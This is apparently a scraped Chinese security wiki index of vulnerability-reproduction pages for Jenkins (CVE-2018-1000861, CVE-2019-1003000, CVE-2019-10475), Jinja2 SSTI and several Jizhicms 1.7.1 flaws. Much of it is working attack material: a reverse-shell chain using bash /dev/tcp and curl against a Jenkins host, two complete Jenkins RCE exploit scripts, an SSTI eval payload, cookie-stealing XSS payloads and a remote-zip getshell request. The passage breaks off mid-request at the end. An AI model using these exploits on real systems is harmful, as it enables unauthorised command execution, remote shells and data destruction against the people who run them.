远程命令执行漏洞/（CVE-2018-1000861）Jenkins 远程命令执行漏洞.html","title":"（CVE-2018-1000861）Jenkins 远程命令执行漏洞","keywords":"","body":"（CVE-2018-1000861）Jenkins 远程命令执行漏洞 一、漏洞简介 Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。 通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。 二、漏洞影响 Jenkins Version \\ Jenkins LTS Version \\ 三、复现过程 漏洞复现: 1.此漏洞是没有回显的,所以我们这里直接反弹shell: 此漏洞的POC(直接GET请求即可): GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22touch%20/tmp/CVE-2018-1000861_is_success%22.execute()}} 2.我们这里采取下载文件的方法来反弹shell (1) 先在我们的服务器上防止一个文本,内容为: bash -i >& /dev/tcp/172.26.1.156/9999 0>&1 (2) 然后我们替换POC中执行命令的部分为下载文件的命令: curl -o /tmp/1.sh http://172.26.1.156:8080/1.txt 替换后的POC: http://172.26.1.129:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22curl+-o+/tmp/1.sh+http://172.26.1.156:8080/1.txt%22.execute()}} (3) 给予下载的脚本执行权限: chmod 777 /tmp/1.sh 替换后的POC: http://172.26.1.129:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22chmod+777+/tmp/1.sh%22.execute()}} (4) 然后在我们接收shell的机器上监听之前写的端口: nc -lvvp 9999 (5) 直接bash执行我们下载的脚本 bash /tmp/1.sh 替换后的POC: http://172.26.1.129:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20{public%20x(){%22bash+/tmp/1.sh%22.execute()}} (6) 回到我们监听端口的机器: Jenkins远程命令执行漏洞/media/rId27.jpg) 可以看到已经成功获取到了shell! poc useage $ curl -s -I http://jenkins/| grep X-Jenkins X-Jenkins: 2.137 X-Jenkins-Session: 20f72c2e X-Jenkins-CLI-Port: 50000 X-Jenkins-CLI2-Port: 50000 $ python exp.py http://jenkins/ 'curl orange.tw' [*] ANONYMOUS_READ disable! [*] Bypass with CVE-2018-1000861! [*] Exploit success!(it should be :P) Jenkins远程命令执行漏洞/media/rId29.jpg) #!/usr/bin/python # coding: UTF-8 # author: Orange Tsai(@orange_8361) # import sys import requests from enum import Enum # remove bad SSL warnings try: requests.packages.urllib3.disable_warnings() except: pass endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript' class mode(Enum): ACL_PATCHED = 0 NOT_JENKINS = 1 READ_ENABLE = 2 READ_BYPASS = 3 ENTRY_NOTFOUND = 999 def usage(): print ''' Usage: python exp.py ''' def _log(msg, fail=False): nb = '[*]' if fail: nb = '[-]' print '%s %s' % (nb, msg) def _get(url, params=None): r = requests.get(url, verify=False, params=params) return r.status_code, r.content def _add_bypass(url): return url + 'securityRealm/user/admin/' def check(url): flag, accessible = mode.ACL_PATCHED, False # check ANONYMOUS_READ status, content = _get(url) if status == 200 and 'adjuncts' in content: flag, accessible = mode.READ_ENABLE, True _log('ANONYMOUS_READ enable!') elif status == 403: _log('ANONYMOUS_READ disable!') # check ACL bypass, CVE-2018-1000861 status, content = _get(_add_bypass(url)) if status == 200 and 'adjuncts' in content: flag, accessible = mode.READ_BYPASS, True else: flag = mode.NOT_JENKINS # check entry point, CVE-2019-1003005 if accessible: if flag is mode.READ_BYPASS: url = _add_bypass(url) status, content = _get(url + endpoint) if status == 404: flag = mode.ENTRY_NOTFOUND return flag def exploit(url, cmd): payload = 'public class x{public x(){new String(\"%s\".decodeHex()).execute()}}' % cmd.encode('hex') params = { 'sandbox': True, 'value': payload } status, content = _get(url + endpoint, params) if status == 200: _log('Exploit success!(it should be :P)') elif status == 405: _log('It seems Jenkins has patched the RCE gadget :(') else: _log('Exploit fail with HTTP status [%d]' % status, fail=True) if 'stack trace' in content: for _ in content.splitlines(): if _.startswith('Caused:'): _log(_, fail=True) if __name__ == '__main__': if len(sys.argv) != 3: usage() exit() url = sys.argv[1].rstrip('/') + '/' cmd = sys.argv[2] flag = check(url) if flag is mode.ACL_PATCHED: _log('It seems Jenkins is up-to-date(>2.137) :(', fail=True) elif flag is mode.NOT_JENKINS: _log('Is this Jenkins?', fail=True) elif flag is mode.READ_ENABLE: exploit(url, cmd) elif flag is mode.READ_BYPASS: _log('Bypass with CVE-2018-1000861!') exploit(_add_bypass(url), cmd) else: _log('The `checkScript` is not found, please try other entries(see refs)', fail=True) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:27 "},"Web安全/Jenkins/（CVE-2019-1003000）Jenkins 远程代码执行漏洞/（CVE-2019-1003000）Jenkins 远程代码执行漏洞.html":{"url":"Web安全/Jenkins/（CVE-2019-1003000）Jenkins 远程代码执行漏洞/（CVE-2019-1003000）Jenkins 远程代码执行漏洞.html","title":"（CVE-2019-1003000）Jenkins 远程代码执行漏洞","keywords":"","body":"（CVE-2019-1003000）Jenkins 远程代码执行漏洞 一、漏洞简介 该漏洞存在于Declarative Plugin 1.3.4.1之前的版本, Groovy Plugin 2.61.1之前的版本以及 Script Security Plugin 1.50之前的版本。该漏洞通过将AST转换注释（如\\@Grab）应用于源代码元素，可以在脚本编译阶段避免脚本安全沙箱保护。所以会造成具有\"Overall/Read\"权限的用户或能够控制SCM中的Jenkinsfile或者sandboxed Pipeline共享库内容的用户可以绕过沙盒保护并在Jenkins主服务器上执行任意代码。 二、漏洞影响 Declarative Plugin \\ Groovy Plugin \\ Script Security Plugin \\ 三、复现过程 环境搭建 gitclone https://github.com/ianxtianxt/cve-2019-1003000-jenkins-rce-poc.git cdcve-2019-1003000-jenkins-rce-poc pipinstall -r requirements.txt cdsample-vuln ./run.sh 输入账号密码user1:user1 Jenkins远程代码执行漏洞/media/rId25.png) \\poc进行攻击pythonexploit.py --url http://www.0-sec.org:8080 --job my-pipeline --usernameuser1 --password user1 --cmd \"whoami\"** Jenkins远程代码执行漏洞/media/rId26.png) Jenkins远程代码执行漏洞/media/rId27.png) poc #!/usr/bin/python # Author: Adam Jordan # Date: 2019-02-15 # Repository: https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc # PoC for: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative) import argparse import jenkins import time from xml.etree import ElementTree payload = ''' import org.buildobjects.process.ProcBuilder @Grab('org.buildobjects:jproc:2.2.3') class Dummy{ } print new ProcBuilder(\"/bin/bash\").withArgs(\"-c\",\"%s\").run().getOutputString() ''' def run_command(url, cmd, job_name, username, password): print '[+] connecting to jenkins...' server = jenkins.Jenkins(url, username, password) print '[+] crafting payload...' ori_job_config = server.get_job_config(job_name) et = ElementTree.fromstring(ori_job_config) et.find('definition/script').text = payload % cmd job_config = ElementTree.tostring(et, encoding='utf8', method='xml') print '[+] modifying job with payload...' server.reconfig_job(job_name, job_config) time.sleep(3) print '[+] putting job build to queue...' queue_number = server.build_job(job_name) time.sleep(3) print '[+] waiting for job to build...' queue_item_info = {} while 'executable' not in queue_item_info: queue_item_info = server.get_queue_item(queue_number) time.sleep(1) print '[+] restoring job...' server.reconfig_job(job_name, ori_job_config) time.sleep(3) print '[+] fetching output...' last_build_number = server.get_job_info(job_name)['lastBuild']['number'] console_output = server.get_build_console_output(job_name, last_build_number) print '[+] OUTPUT:' print console_output if __name__ == '__main__': parser = argparse.ArgumentParser(description='Jenkins RCE') parser.add_argument('--url', help='target jenkins url') parser.add_argument('--cmd', help='system command to be run') parser.add_argument('--job', help='job name') parser.add_argument('--username', help='username') parser.add_argument('--password', help='password') args = parser.parse_args() run_command(args.url, args.cmd, args.job, args.username, args.password) 参考链接 https://www.freebuf.com/column/197026.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:30 "},"Web安全/Jenkins/（CVE-2019-10475）反射xss/（CVE-2019-10475）反射xss.html":{"url":"Web安全/Jenkins/（CVE-2019-10475）反射xss/（CVE-2019-10475）反射xss.html","title":"（CVE-2019-10475）反射xss","keywords":"","body":"（CVE-2019-10475） 插件反射型xss 一、漏洞简介 二、漏洞影响 360 FireLine插件， 最高包括1.7.2 Bitbucket OAuth插件， 最高包括0.9 Build-metrics插件 1.3及以下 部署WebLogic Plugin 最高至4.1 Dynatrace应用程序监视插件， 最高包括2.1.3 Dynatrace应用程序监视插件， 最高包括2.1.4 ElasticBox Jenkins Kubernetes CI / CD插件， 最高至1.3 包含1.1.4及以下版本的 全局Post Script插件 Libvirt Slaves插件， 最高包括1.8.5 截至 2.7.0的 Mattermost Notification插件 Sonar Gerrit插件， 最高包括2.3 Zulip插件 （包括1.1.0及以下） 三、复现过程 1、手工复现 该vulnearble插件位于http://localhost:8080/plugin/build-metrics/，漏洞参数为label。 http://192.168.1.75:8080/plugin/build-metrics/getBuildStats?label=alert(\"CVE-2019-10475\")&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search 反射xss/media/rId26.png) 2、利用脚本 #!/usr/bin/env python import sys import argparse VULN_URL = '''{base_url}/plugin/build-metrics/getBuildStats?label={inject}&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search''' def get_parser(): parser = argparse.ArgumentParser(description='CVE-2019-10475') parser.add_argument('-p', '--port', help='port', default=80, type=int) parser.add_argument('-d', '--domain', help='domain', default='localhost', type=str) parser.add_argument('-i', '--inject', help='inject', default='alert(\"CVE-2019-10475\")', type=str) return parser def main(): parser = get_parser() args = vars(parser.parse_args()) port = args['port'] domain = args['domain'] inject = args['inject'] if port == 80: base_url = f'http://{domain}' elif port == 443: base_url = f'https://{domain}' else: base_url = f'http://{domain}:{port}' build_url = VULN_URL.format(base_url=base_url, inject=inject) print(build_url) return 0 if __name__ == '__main__': sys.exit(main()) Usage: $ python3 CVE-2019-10475.py --help usage: CVE-2019-10475.py [-h] [-p PORT] [-d DOMAIN] [-i INJECT] CVE-2019-10475 optional arguments: -h, --help show this help message and exit -p PORT, --port PORT port -d DOMAIN, --domain DOMAIN domain -i INJECT, --inject INJECT injec Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:29 "},"Web安全/Jenkins/Jenkins 功能未授权访问导致的远程命令执行漏洞/Jenkins 功能未授权访问导致的远程命令执行漏洞.html":{"url":"Web安全/Jenkins/Jenkins 功能未授权访问导致的远程命令执行漏洞/Jenkins 功能未授权访问导致的远程命令执行漏洞.html","title":"Jenkins 功能未授权访问导致的远程命令执行漏洞","keywords":"","body":"Jenkins功能未授权访问导致的远程命令执行漏洞 一、漏洞简介 Jenkins管理登陆之后，后台\"系统管理\"功能，有个\"脚本命令行的\"功能，它的作用是执行用于管理或故障探测或诊断的任意脚本命令，利用该功能，可以执行系统命令，该功能实际上Jenkins正常的功能，由于很多管理账号使用了弱口令，或者管理后台存在未授权访问，导致该功能会对Jenkins系统服务器产生比较严重的影响和危害。 二、漏洞影响 三、复现过程 找到\"系统管理\"------\"脚本命令行\"。 输入任意的Groovy脚本并在服务器上执行它。对于故障排除和诊断很有用。使用'println'命令查看输出（如果使用System.out，它将输出到服务器的标准输出，很难看到。）示例： println(Jenkins.instance.pluginManager.plugins) 在脚本命令行中输入下面的语句，即可执行相应的命令： println \"whoami\".execute().text println \"ifconfig\".execute().text image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:25 "},"Web安全/Jinja2/Jinja2 SSTI 服务端模版注入攻击/Jinja2 SSTI 服务端模版注入攻击.html":{"url":"Web安全/Jinja2/Jinja2 SSTI 服务端模版注入攻击/Jinja2 SSTI 服务端模版注入攻击.html","title":"Jinja2 SSTI 服务端模版注入攻击","keywords":"","body":"Flask / jinja2 SSTI 服务端模版注入攻击 一、漏洞简介 SSTI即服务端模版注入攻击。由于程序员代码编写不当，导致用户输入可以修改服务端模版的执行逻辑，从而造成XSS,任意文件读取，代码执行等一系列问题。 二、漏洞影响 三、复现过程 编译及运行测试环境： docker-compose build docker-compose up -d 访问http://www.0-sec.org/?name={{233*233}}，得到54289，说明SSTI漏洞存在。 获取eval函数并执行任意python代码的POC： {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 访问http://www.0-sec.org:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D，得到执行结果： 参考链接 https://drops.org.cn/Python/flask-jinja2-ssti.html\\#directory072591889128396616 https://vulhub.org/\\#/environments/flask/ssti/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:31 "},"Web安全/Jizhicms/Jizhicms 1.7.1 ._user_release.html sql注入漏洞/Jizhicms 1.7.1 ._user_release.html sql注入漏洞.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 ._user_release.html sql注入漏洞/Jizhicms 1.7.1 ._user_release.html sql注入漏洞.html","title":"Jizhicms 1.7.1 ._user_release.html sql注入漏洞","keywords":"","body":"Jizhicms 1.7.1 ./user/release.html sql注入漏洞 一、漏洞简介 二、漏洞影响 Jizhicms 1.7.1 三、复现过程 同样还是在发表文章这 POST /user/release.html HTTP/1.1 Host: www.0-sec.org:8091 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 153 Origin: http://www.0-sec.org:8091 Connection: close Referer: http://www.0-sec.org:8091/user/release/molds/article.html Cookie: PHPSESSID=84mcpgsvrgnfag0fnl3ngjm2eo; XDEBUG_SESSION=PHPSTORM ajax=1&isshow=&molds=article&tid=2&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&keywords=123&litpic=&description=123 可以看到有明显的时间延迟，存在基于时间的延迟注入为了直观的展示是否进行了拼接sql语句的操作，监控下sql语句的执行，在mysql监控工具中可以看到没有任何过滤就进行了sql语句的拼接，触发了sql注入漏洞定位到漏洞函数release函数，重点关注下sql语句的拼接问题，一共有两处进行了sql的拼接，只要在进行拼接前没有进行过滤就会存在sql注入漏洞其中$this->classtypedata对应的是数据库中的classtype表中的数据然后跟进到get_fields_data函数，根据xdebug调试代码的运行情况，发现fields为空，所以会直接返回data,其中并没有进行任何过滤在release函数函数中只是要求$w[\\'tid\\']!=0即可，所以我们可以在tid参数和molds参数处构造sql注入语句用slmap跑的结果 参考链接 https://xz.aliyun.com/t/7861\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:32 "},"Web安全/Jizhicms/Jizhicms 1.7.1 ._user_userinfo.html sql注入漏洞/Jizhicms 1.7.1 ._user_userinfo.html sql注入漏洞.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 ._user_userinfo.html sql注入漏洞/Jizhicms 1.7.1 ._user_userinfo.html sql注入漏洞.html","title":"Jizhicms 1.7.1 ._user_userinfo.html sql注入漏洞","keywords":"","body":"Jizhicms 1.7.1 ./user/userinfo.html sql注入漏洞 一、漏洞简介 二、漏洞影响 Jizhicms 1.7.1 三、复现过程 在更改个人资料处 POST /user/userinfo.html HTTP/1.1 Host: 127.0.0.1:8091 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 138 Origin: http://127.0.0.1:8091 Connection: close Referer: http://127.0.0.1:8091/user/userinfo.html Cookie: PHPSESSID=84mcpgsvrgnfag0fnl3ngjm2eo Upgrade-Insecure-Requests: 1 litpic=&file=&username=test&tel=&email=1%401.com&sex=0&province=&city=&address=&password=&repassword=&signature=&submit=%E6%8F%90%E4%BA%A4 在userinfo函数中可以看到只对tel ,pass sex repass等参数进行了过滤，并不涉及province city address等地址，意味着可以随意拼接sql语句触发 sql注入漏洞通过mysql监控工具可以看到已经带入查询，触发了sql注入漏洞通过sqlmap跑一下 参考链接 https://xz.aliyun.com/t/7861\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:34 "},"Web安全/Jizhicms/Jizhicms 1.7.1 从sql注入到任意文件上传/Jizhicms 1.7.1 从sql注入到任意文件上传.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 从sql注入到任意文件上传/Jizhicms 1.7.1 从sql注入到任意文件上传.html","title":"Jizhicms 1.7.1 从sql注入到任意文件上传","keywords":"","body":"Jizhicms 1.7.1 从sql注入到任意文件上传 一、漏洞简介 二、漏洞影响 Jizhicms 1.7.1 三、复现过程 从回显可以明确的看到这是一个报错注入，如果没有回显报错的话，为了查看是否进行了sql语句的拼接可以去查看mysql的log日志,可以通过Navicat的日志功能去查看在对CMS不是很熟悉的情况下可以通过搜索关键字来定位大概的漏洞位置，customurl成功的引起了我的注意，这是表的名字，经过简单判断，定位到函数位置为/Home/c/HomeController.php中342-355行中，用户传入参数url然后进入到find函数中处理跟进到find函数中，位于/FrPHP/lib/Model.php，find函数主要去调用findAll函数去拼接执行sql语句 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } 这里看代码看的头疼，为了直观展示代码的执行过程可以用phpstorm配合xdebug的方式去调试php代码，可以看到将我们传入的参数直接带入查询，然后调用getArray函数去执行 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { ..... ..... if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $table = self::$table; $sql = \"SELECT {$fields} FROM {$table} {$where}\"; return $this->db->getArray($sql); } 在 /FrPHP/db/DBholder.php中, getArray函数调用query函数，如果有错误将输出错误信息 在接下来发现该CMS允许上传的文件类型是保存在数据库中的通过数据库写入到缓存文件，在使用时从缓存文件中去看上传的类型是不是缓存文件中允许的，如果是则允许上传。那可以通过SQL注入漏洞更新下数据库，写入允许上传的后缀php,即可实现getshell然后登陆后台清空缓存让网站重新获得新的缓存，然后上传php文件。看到上传成功了既然是代码审计，我们也来跟下网站获取上传类型的方式在/A/c/CommonController.php 中uploads函数中是从webconf中获得的fileType的值 $fileType = $this->webconf['fileType']; if(strpos($fileType,strtolower($pix))===false){ $data['error'] = \"Error: 文件类型不允许上传！\"; $data['code'] = 1002; JsonReturn($data); } webconf函数位于/Conf/Functions.php中,通过调用getCache函数来获取相关的值 function webConf($str=null){ //v1.3 取消文件存储 //$web_config = include(APP_PATH.'Conf/webconf.php'); $webconfig = getCache('webconfig'); } getCache函数位于/FrPHP/common/Functions.php function getCache($str=false){ if(!$str){ return false; } //获取 $s = md5($str).'frphp'.md5($str); $cache_file_data = APP_PATH.'cache/data/'.$s.'.php'; if(!file_exists($cache_file_data)){ return false; } $last_time = filemtime($cache_file_data);//创建文件时间 $res = file_get_contents($cache_file_data); $res = substr($res,14); $data = json_decode($res,true); if(($data['frcache_time']+$last_time)=0){ unlink($cache_file_data); return false; }else{ return $data['frcache_data']; } } getCache从/cache/data/中获取相关的值 缓存文件的名字为md5(webconfig).\\'frphp\\'.md5(webconfig)可以看到已经成功缓存,php为允许上传的类型 参考链接 https://xz.aliyun.com/t/7775\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:35 "},"Web安全/Jizhicms/Jizhicms 1.7.1 反射型xss/Jizhicms 1.7.1 反射型xss.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 反射型xss/Jizhicms 1.7.1 反射型xss.html","title":"Jizhicms 1.7.1 反射型xss","keywords":"","body":"Jizhicms 1.7.1 反射型xss 一、漏洞简介 二、漏洞影响 Jizhicms 1.7.1 三、复现过程 https://wiki.0-sec.org/img/1'%3Cimg%20src=1%20onerror=alert(1)%3E-- 四、参考链接 https://xz.aliyun.com/t/7775\\#toc-2 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:37 "},"Web安全/Jizhicms/Jizhicms 1.7.1 后台getshell/Jizhicms 1.7.1 后台getshell.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 后台getshell/Jizhicms 1.7.1 后台getshell.html","title":"Jizhicms 1.7.1 后台getshell","keywords":"","body":"Jizhicms 1.7.1 后台getshell 一、漏洞简介 二、漏洞影响 Jizhicms 1.7.1 三、复现过程 POST /admin.php/Plugins/update.html HTTP/1.1 Host: www.0-sec.org:8091 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 80 Origin: http://www.0-sec.org:8091 Connection: close Referer: http://www.0-sec.org:8091/admin.php/Plugins/ Cookie: PHPSESSID=tq79jo8omp5s72lq101noj48lq action=start-download&filepath=msgphone&download_url=http://www.0-sec.org/test/a.zip 攻击者可以控制download_url传入参数的值，从而传入被压缩的可执行脚本，然后该压缩包会被解压并传入到特定位置，实现getshell所以只需要攻击者在自己控制的网站上压缩可执行脚本然后将url赋值给download_url即可实现任意文件上传定位下函数位置，该函数位于/A/c/PluginsController.php下的update函数传进来的值通过frparam函数处理之后变赋值给了remote_url跟进到frparam函数函数中，该函数位于/FrPHP/lib/Controller.php中 public function frparam($str=null, $int=0,$default = FALSE, $method = null){ $data = $this->_data; if($str===null) return $data; if(!array_key_exists($str,$data)){ return ($default===FALSE)?false:$default; } if($method===null){ $value = $data[$str]; }else{ $method = strtolower($method); switch($method){ case 'get': $value = $_GET[$str]; break; case 'post': $value = $_POST[$str]; break; case 'cookie': $value = $_COOKIE[$str]; break; } } return format_param($value,$int); } 该函数并没有对传入的值进行过滤，只是简单的从data数组里取数据然后继续回到update函数，在获取到了remote_url的值后便进行了下载以及解压缩的操作最后解压到的文件夹为/A/exts 参考链接 https://xz.aliyun.com/t/7775\\#toc-3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:38 "},"Web安全/Jizhicms/Jizhicms 1.7.1 后台任意文件夹压缩下载/Jizhicms 1.7.1 后台任意文件夹压缩下载.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 后台任意文件夹压缩下载/Jizhicms 1.7.1 后台任意文件夹压缩下载.html","title":"Jizhicms 1.7.1 后台任意文件夹压缩下载","keywords":"","body":"Jizhicms 1.7.1 后台任意文件夹压缩下载 一、漏洞简介 二、漏洞影响 Jizhicms 1.7.1 三、复现过程 这个的漏洞触发同样位于CMS的插件部分,只需要替换filepath的值为要打包的文件夹即可打包网站下载根据url定位到漏洞位置，位于/A/c/PluginsController.php中的output函数，该函数主要是获取用户输入的文件名然后进行压缩在发送给客户端,还是这个frparam函数，由前文可知该函数没有对传入的参数进行过滤的话，从而导致了可以进行目录穿越，然后可以压缩不同的目录下载任意文件，条件只需要知道文件夹名字 参考链接 https://xz.aliyun.com/t/7775\\#toc-3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:39 "},"Web安全/Jizhicms/Jizhicms 1.7.1 后台配置文件删除/Jizhicms 1.7.1 后台配置文件删除.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 后台配置文件删除/Jizhicms 1.7.1 后台配置文件删除.html","title":"Jizhicms 1.7.1 后台配置文件删除","keywords":"","body":"Jizhicms 1.7.1 后台配置文件删除 一、漏洞简介 二、漏洞影响 三、复现过程 该漏洞的触发同样也是源于frparam函数没有对传入的文件路径进行必要的过滤在 /A/c/PluginsController.php中的action_do函数中的483到494行中由于未对目录进行限制导致的目录穿越漏洞，只要文件中包含config.php文件即可触发deldir函数进行文件删除操作Conf文件夹中包含config.php，该文件夹为网站配置信息储存的地方，一旦被删除，网站将无法正常运行deldir函数的功能是遍历目标文件下的所有文件进行删除操作 function deldir($dir) { //先删除目录下的文件： $dh=opendir($dir); while ($file=readdir($dh)) { if($file!=\".\" && $file!=\"..\") { $fullpath=$dir.\"/\".$file; if(!is_dir($fullpath)) { unlink($fullpath); } else { deldir($fullpath); } } } closedir($dh); 成功删除了Conf文件夹 四、参考链接 https://xz.aliyun.com/t/7775\\#toc-3 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:54:41 "},"Web安全/Jizhicms/Jizhicms 1.7.1 存储XSS漏洞/Jizhicms 1.7.1 存储XSS漏洞.html":{"url":"Web安全/Jizhicms/Jizhicms 1.7.1 存储XSS漏洞/Jizhicms 1.7.1 存储XSS漏洞.html","title":"Jizhicms 1.7.1 存储XSS漏洞","keywords":"","body":"Jizhicms 1.7.1 存储XSS漏洞 一、漏洞简介 二、漏洞影响 Jizhicms 1.7.1 三、复现过程 首先自己注册一个账户然后登陆，在文章标题处插入XSS payload payload: 管理员登录后台点击编辑且没有修改里面的字符串就保存的话那便会触发XSS漏洞首先看一下在前台发表文章处的请求数据包 POST /user/release.html HTTP/1.1 Host: www.0-sec.org:8091 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 